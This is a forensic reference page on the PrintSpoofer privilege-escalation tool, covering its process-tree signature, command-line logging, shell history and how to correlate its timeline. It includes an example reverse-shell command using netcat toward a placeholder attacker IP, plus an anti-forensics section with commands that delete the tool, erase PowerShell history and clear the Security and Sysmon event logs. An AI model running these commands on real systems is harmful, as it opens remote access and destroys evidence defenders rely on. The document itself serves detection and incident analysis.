# PrintSpoofer — Source Evidence

## Attacker-side artifacts

Because PrintSpoofer is a standalone executable that performs a one-shot privilege escalation without persistence, source-side evidence is minimal and largely **process-based** rather than file-based.

### Process execution artifacts

**Parent-child relationship:**
- **PrintSpoofer.exe** (parent, running as service account with SeImpersonate)
  - └─ **spawned process** (child, running as SYSTEM, e.g., `cmd.exe`, `powershell.exe`, `nc.exe`)

The parent process (`PrintSpoofer.exe`) remains in memory for the duration of the command execution, then exits once the child completes (if `-i` not set, or when the interactive session ends if `-i` is set).

**Key forensic detail:** The process tree clearly shows the privilege escalation—a non-SYSTEM parent spawning a SYSTEM child. This is the **primary source-side signature**.

### Command-line artifacts

**PrintSpoofer.exe command line:**
```
PrintSpoofer.exe -c "cmd /c whoami"
```

**Stored in:**
- Sysmon Event ID 1 (Process Create) — full command line, parent PID, user SID.
- Windows Event 4688 (Process Creation) — similar, but often truncated in ETW tracing.
- Memory dumps (Process Environment Block / PEB) — if the process is still running when dumped.
- Process command-line tools (`wmic`, `Get-Process`, `tasklist /v`) — volatile, only visible while running.

**Important:** `PrintSpoofer.exe` binary name is **not typically obfuscated** by operators (no native renaming within the tool). However, defenders often see renamed copies (`svchost.exe`, `rundll32.exe`, `system.exe`) in real-world incidents—a rename is trivial but breaks simple filename-based detections.

### Shell/command history

**PowerShell history:**
- If PrintSpoofer is invoked from a PowerShell prompt, the command line appears in:
  - `$PROFILE` console history (in-memory, temporary).
  - `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (if PSReadline is enabled, default on PS 5.0+).

**Command prompt (cmd.exe) history:**
- `doskey /history` (in-memory only, lost on shell exit).
- No persistent history file for cmd.exe; only in memory while the shell is open.

**WinRM/RDP history:**
- If executed via WinRM (`Invoke-Command`), the command appears in WinRM operational logs.
- If executed via RDP, only if the RDP session logs commands (Group Policy dependent).

### Network artifacts (minimal)

**RPC endpoint binding:**
- PrintSpoofer creates a **local RPC endpoint** (named pipe or DCE/RPC port) to receive the Print Spooler's coerced authentication.
- This is **not network-visible**—RPC binding is local-only.
- No outbound network traffic originates from PrintSpoofer itself.
- However, if the spawned command (e.g., `nc.exe -e cmd <attacker_IP> <port>`) initiates a reverse shell, network artifacts appear under the **spawned process**, not PrintSpoofer.

### Artifact retention timeline

| Artifact | Retention | Cleared By |
|---|---|---|
| **Process tree (Sysmon 1)** | Until process exits; logs persist indefinitely in ETW. | Process termination; log rotation. |
| **Command line (Sysmon 1, Event 4688)** | Same as process tree. | Log rotation, manual log clearing. |
| **PrintSpoofer.exe binary** | On disk (if written there). | Operator manual deletion, AV quarantine, log rotation (if in temp). |
| **Spawned child process** | Depends on child; some persist, others are temporary. | Child process termination, reboot. |
| **PowerShell history** | Until PowerShell session closes; file persists until deletion. | Session exit, `Clear-History`, file deletion. |
| **WinRM logs** | Event logs persist; log rotation/clearing. | Log rotation policy. |

### Evidentiary value for timeline correlation

**Source-side process tree is critical for correlation with target-side evidence:**

1. **PrintSpoofer.exe spawn timestamp** (from Sysmon 1 or ETW logs) correlates with the spawned SYSTEM-context child process.
2. **Child process actions** (file creation, registry modification, command execution) on the target are **bracketed** by the PrintSpoofer execution timeline on the source.
3. **Example correlation:**
   - Source: `PrintSpoofer.exe` starts at 14:23:45, spawns `cmd.exe` as SYSTEM.
   - Target: At 14:23:45, `C:\Windows\Temp\hashes.txt` is created by SYSTEM context.
   - Correlation: The `hashes.txt` file creation is directly attributable to the PrintSpoofer execution on the source machine.

### Clean-up and anti-forensics

**PrintSpoofer does not clean up after itself; this is an operator responsibility:**

1. **Delete the PrintSpoofer binary:**
   ```powershell
   Remove-Item -Path C:\Windows\Temp\PrintSpoofer.exe -Force
   ```

2. **Clear command history:**
   ```powershell
   Clear-History
   Remove-Item -Path C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -Force
   ```

3. **Clear event logs** (requires admin/SYSTEM):
   ```powershell
   wevtutil cl Security
   wevtutil cl Microsoft-Windows-Sysmon/Operational
   ```

However, **log clearing is itself a suspicious event** and is often detected/logged.

---

## Summary

**PrintSpoofer source artifacts are ephemeral:**
- The primary signature is the **process tree**: low-privilege parent → SYSTEM child.
- **Command line** recording (Sysmon, ETW) captures the attacker's exact intent.
- **No persistent artifacts** (files, registry, services) are created by PrintSpoofer itself.
- Clean-up requires deletion of the binary and clearing of historical logs, which is noisy.

**For forensic reconstruction:**
- Correlate PrintSpoofer's execution timestamp with the spawned child's actions on the target.
- Look for the distinctive process tree pattern across Sysmon, ETW, and Windows Event logs.
- Expect the source machine to have much less evidence than the target (where the SYSTEM-context actions occur).
